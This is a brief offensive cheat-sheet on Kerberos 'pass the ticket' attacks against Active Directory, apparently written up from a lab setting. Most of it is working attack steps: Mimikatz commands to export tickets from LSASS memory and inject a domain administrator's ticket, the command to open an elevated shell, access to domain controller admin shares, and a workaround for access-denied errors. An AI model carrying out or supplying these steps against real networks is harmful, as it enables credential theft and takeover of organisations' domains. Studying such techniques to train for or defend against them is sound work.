# Pass The Ticket

[Mimikatz](Mimikatz.md)

Pass the ticket works by dumping the TGT from the LSASS memory (memory process that stores credentials on an Active Directory server) of the machine.

> When you dump tickets with mimikatz, it will give us a `.kirbi` ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory.

> Always take an admin ticket from krbtgt

```sh
sekurlsa::tickets /export
# will export all .kirbi tickets into the current directory

kerberos::ptt [0;2f08fb]-2-0-60a10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
# Always take an admin ticket from krbtgt

misc::cmd
# will open a new elevated command prompt
```
Here we simply verify that we successfully impersonated the ticket by listing our cached tickets.

```sh
klist
# We will not use mimikatz for the rest of the attack.
```

After impersonating the ticket, which gives us the same rights as the TGT we impersonated.

To access a domain machine:

```sh
dir \\DOMAIN-CONTROLLER\admin$
dir \\Machine-IP\C$
```

## Encountered Issue
It may happen that when we try to access the `admin$` directory on a DC, we simply get "Access Denied"!

To solve this problem, you need to use the DC hostname

```sh
nltest /dc:CONTROLLER.LOCAL
# win2012dc.CONTROLLER.LOCAL
```

```sh
dir \\win2012dc.CONTROLLER.LOCAL\admin$
```
